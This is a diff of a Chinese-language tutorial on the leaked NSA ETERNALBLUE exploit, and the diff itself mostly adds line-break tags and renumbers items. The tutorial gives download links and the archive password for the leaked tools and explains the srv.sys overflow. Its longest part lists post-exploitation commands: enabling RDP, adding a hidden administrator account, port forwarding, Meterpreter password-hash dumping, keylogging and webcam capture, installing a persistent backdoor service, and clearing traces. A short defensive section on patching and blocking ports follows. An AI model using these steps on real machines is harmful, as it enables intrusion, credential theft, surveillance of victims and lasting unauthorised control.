@@ -1,12 +1,11 @@
-﻿# NSA方程式工具利用与分析
+# NSA方程式工具利用与分析
 
-标签（空格分隔）： NSA Eternalblue Windows漏洞
 
 ---
 
-**下载地址：**https://yadi.sk/d/NJqzpqo_3GxZA4
-**解压密码**：Reeeeeeeeeeeeeee
-**github下载地址：**https://github.com/misterch0c/shadowbroker
+**下载地址：**https://yadi.sk/d/NJqzpqo_3GxZA4<br>
+**解压密码**：Reeeeeeeeeeeeeee<br>
+**github下载地址：**https://github.com/misterch0c/shadowbroker<br>
 
 释放的工具总共包含三个文件夹，
 
@@ -44,12 +43,12 @@
 
 ###**ETERNALBLUE攻击原理分析**
 
-ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。
-漏洞发生处：C:\Windows\System32\drivers\srv.sys
-注：srv.sys是Windows系统驱动文件，是微软默认的信任文件。
-漏洞函数：`unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2)`
-触发点：`_memmove(v5, (const void *)(a2 + 5 + *(_BYTE *)(a1 + 5)), *(_WORD *)(a1 + 6));`
-原因：逻辑不正确导致的越界写入
+ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT（NetBIOS over TCP/IP）影响Windows XP,Windows 2008 R2和Windows 7系统。<br>
+漏洞发生处：C:\Windows\System32\drivers\srv.sys<br>
+注：srv.sys是Windows系统驱动文件，是微软默认的信任文件。<br>
+漏洞函数：`unsigned int __fastcall SrvOs2FeaToNt(int a1, int a2)`<br>
+触发点：`_memmove(v5, (const void *)(a2 + 5 + *(_BYTE *)(a1 + 5)), *(_WORD *)(a1 + 6));`<br>
+原因：逻辑不正确导致的越界写入<br>
 官方补丁修复前：
 
     int __fastcall SrvOs2FeaListSizeToNt(_DWORD *a1)
@@ -97,10 +96,11 @@ ETERNALBLUE是一个RCE漏洞利用，通过SMB（Server Message Block）和NBT�
         }
         //SNIP...
     }
-具体见参考资料5
+具体见参考资料5<br>
+
 ###**漏洞复现**
 
- 1. 环境搭建
+ 1. 环境搭建<br>
 | 主机类型 | OS | IP
 |----|---|---
 | 攻击机1 | win2003| 10.10.10.130
@@ -136,57 +136,57 @@ use Eternalblue
  
 ###**后渗透攻击**
  
-1. 开3389端口
+1. 开3389端口<br>
 （1）`wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != “”) call 
-setallowtsconnections 1`
+setallowtsconnections 1`<br>
 （2）`wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =’RDP-Tcp’) call 
-setuserauthenticationrequired 1`
-（3）`reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f`
+setuserauthenticationrequired 1`<br>
+（3）`reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t REG_DWORD /d 0 /f`<br>
 
- 针对win XP及win2003只需要第3条命令
- 针对win 7需要第1，2条命令
- 针对win 2012需要3条命令
+ 	针对win XP及win2003只需要第3条命令<br>
+ 	针对win 7需要第1，2条命令<br>
+	 针对win 2012需要3条命令<br>
 
-2. 添加账户进管理组
-`net user sherlly sherlly /add`
-`net localgroup Administrators sherlly /add`
+2. 添加账户进管理组<br>
+	`net user sherlly sherlly /add`
+	`net localgroup Administrators sherlly /add`
 
 
-4. 端口转发
-如果3389端口只限内网访问，可以使用portfwd将端口转发到本地连接
-`portfwd add -l 4444 -p 3389 -r XXX.XXX.XXX.XXX`
-`rdesktop -u root -p toor 127.0.0.1:4444`
+3. 端口转发
+	如果3389端口只限内网访问，可以使用portfwd将端口转发到本地连接<br>
+	`portfwd add -l 4444 -p 3389 -r XXX.XXX.XXX.XXX`
+	`rdesktop -u root -p toor 127.0.0.1:4444`
 
-3. meterpreter自带的多功能shell
+4. meterpreter自带的多功能shell
 
- - hashdump:获取用户密码哈希值，可以用ophcrack等彩虹表工具进行破解明文
- - screenshot:获取屏幕截图
- - webcam_snap:调取对方摄像头拍照
- - keyscan_start,keyscan_dump:记录键盘动作
- - ps:查看当前运行进程
- - sysinfo:查看系统信息
- - getsystem:提权
+	 - hashdump:获取用户密码哈希值，可以用ophcrack等彩虹表工具进行破解明文
+	 - screenshot:获取屏幕截图
+	 - webcam_snap:调取对方摄像头拍照
+	 - keyscan_start,keyscan_dump:记录键盘动作
+	 - ps:查看当前运行进程
+	 - sysinfo:查看系统信息
+	 - getsystem:提权
 
-4. 维持控制
+5. 维持控制<br>
 
- - migrate:将meterpreter会话移至另一个进程内存空间（migrate pid）配合ps使用
- - irb:与ruby终端交互，调用meterpreter封装函数，可以添加Railgun组件直接交互本地的Windows API,阻止目标主机进入睡眠状态
-`irb
-client.core.use("railgun)
-client.railgun.kernel32.SetThreadExecutionState("ES_CONTINUOUS|ES_SYSTEM_REQUIRED")`
- - background:隐藏在后台方便msf终端进行其他操作，session查看对话id
- - session -i X:使用已经成功获取的对话
+	 - migrate:将meterpreter会话移至另一个进程内存空间（migrate pid）配合ps使用
+	 - irb:与ruby终端交互，调用meterpreter封装函数，可以添加Railgun组件直接交互本地的Windows API,阻止目标主机进入睡眠状态
+	`irb
+	client.core.use("railgun)
+	client.railgun.kernel32.SetThreadExecutionState("ES_CONTINUOUS|ES_SYSTEM_REQUIRED")`
+	 - background:隐藏在后台方便msf终端进行其他操作，session查看对话id
+	 - session -i X:使用已经成功获取的对话
 
-5. 植入后门
+6. 植入后门
 
- - 测试是否虚拟机：
- `run post/windows/gather/checkvm `
- - 以系统服务形式安装：在目标主机的31337端口开启监听，使用metsvc.exe安装metsvc-server.exe服务，运行时加载metsrv.dll
- `run metsvc`
- - getgui开启远程桌面：
-`run getgui -u sherlly -p sherlly`
-`run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up_XXX.rc  
- //清除痕迹，关闭服务，删除添加账号`
+	 - 测试是否虚拟机：
+	 `run post/windows/gather/checkvm `
+	 - 以系统服务形式安装：在目标主机的31337端口开启监听，使用metsvc.exe安装metsvc-server.exe服务，运行时加载metsrv.dll
+	 `run metsvc`
+	 - getgui开启远程桌面：
+	`run getgui -u sherlly -p sherlly`
+	`run multi_console_command -rc /root/.msf3/logs/scripts/getgui/clean_up_XXX.rc  
+	 //清除痕迹，关闭服务，删除添加账号`
 
 6. 清除入侵痕迹
 
@@ -202,7 +202,7 @@ client.railgun.kernel32.SetThreadExecutionState("ES_CONTINUOUS|ES_SYSTEM_REQUIRE
 另外，nmap也基于该脚本出了对应扫描脚本[smb-double-pulsar-backdoor.nse][4]，使用方法`nmap -p 445 <target> --script=smb-double-pulsar-backdoor`
 2. 安装相应补丁https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/
 3. 如非必要，关闭25, 88, 139, 445, 3389端口
-4. 使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7)
+4. 使用防火墙、或者安全组配置安全策略，屏蔽对包括445、3389在内的系统端口访问。(见参考资料7)<br>
 ###**参考资料**
 1. http://thehackernews.com/2017/04/swift-banking-hacking-tool.html
 2. http://www.freebuf.com/sectool/132029.html
